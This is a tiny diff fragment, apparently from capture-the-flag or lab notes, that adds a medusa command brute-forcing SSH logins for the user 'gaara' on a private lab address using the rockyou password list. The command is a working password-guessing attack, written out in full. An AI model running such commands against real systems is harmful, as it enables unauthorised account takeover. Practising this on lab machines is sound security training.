@@ -1,5 +1,9 @@
 ```
-
+medusa -u gaara \
+       -P /usr/share/wordlists/rockyou.txt \
+       -h 192.168.105.142 \
+       -M ssh \
+       -n 22
 ```
 
 ```
